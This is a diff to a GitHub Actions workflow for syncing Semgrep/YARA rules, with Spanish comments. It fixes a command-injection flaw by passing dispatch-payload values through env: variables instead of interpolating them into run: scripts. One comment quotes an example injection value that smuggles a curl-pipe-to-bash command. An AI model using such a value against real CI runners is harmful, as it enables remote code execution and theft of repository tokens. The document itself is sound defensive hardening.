@@ -69,17 +69,31 @@ jobs:
       #   5. Si CUALQUIER clave falla: no activa nada (ni siquiera las que
       #      sí verificaron) y termina con código != 0, listando
       #      explícitamente qué clave(s) fallaron.
+      # IMPORTANTE (seguridad): estos valores vienen del payload de un
+      # `repository_dispatch` que dispara el repo de reglas -- NO son un tag
+      # ya verificado, son texto arbitrario hasta que sync_rules.py los
+      # valide. Se pasan SIEMPRE vía `env:` y se leen con `"$VAR"` en bash,
+      # nunca interpolados con `${{ }}` directamente dentro de `run:` --
+      # GitHub Actions sustituye `${{ }}` textualmente en el script ANTES de
+      # ejecutarlo, así que un valor como `v1";curl x|bash;#` interpolado
+      # ahí sería inyección de comandos en el runner (que tiene
+      # `contents: write` + `RULES_REPO_TOKEN`). Vía `env:` el valor llega
+      # como una única variable de entorno, sin volver a pasar por el parser
+      # de shell.
       - name: Sincronizar y verificar reglas por clave (integridad SHA-256)
         id: sync
         env:
           RULES_REPO_TOKEN: ${{ secrets.RULES_REPO_TOKEN }}
+          RULES_REF: ${{ github.event.client_payload.version }}
+          LANGUAGES_CHANGED: ${{ toJson(github.event.client_payload.languages_changed) }}
+          THIRD_PARTY_CHANGED: ${{ toJson(github.event.client_payload.third_party_changed) }}
         run: |
           python scripts/sync_rules.py sync \
             --rules-repo pablojimz/Repo-reglas-SEMGREP-y-YARA \
-            --ref "${{ github.event.client_payload.version }}" \
+            --ref "$RULES_REF" \
             --scope changed \
-            --languages-changed '${{ toJson(github.event.client_payload.languages_changed) }}' \
-            --third-party-changed '${{ toJson(github.event.client_payload.third_party_changed) }}' \
+            --languages-changed "$LANGUAGES_CHANGED" \
+            --third-party-changed "$THIRD_PARTY_CHANGED" \
             --target-root "${{ github.workspace }}" \
             --state-file rules/.rules-state.json \
             --triggered-by sync-rules.yml
@@ -90,6 +104,8 @@ jobs:
       # y el workflow nunca falla en silencio.
       - name: Comitear reglas verificadas como versión activa
         if: success()
+        env:
+          RULES_REF: ${{ github.event.client_payload.version }}
         run: |
           git config user.name "watchgate-rules-bot"
           git config user.email "actions@github.com"
@@ -97,6 +113,6 @@ jobs:
           if git diff --cached --quiet; then
             echo "No hay cambios de contenido (los hashes ya coincidían con la versión activa); nada que comitear."
           else
-            git commit -m "sync(rules): activar reglas verificadas ${{ github.event.client_payload.version }}"
+            git commit -m "sync(rules): activar reglas verificadas $RULES_REF"
             git push
           fi
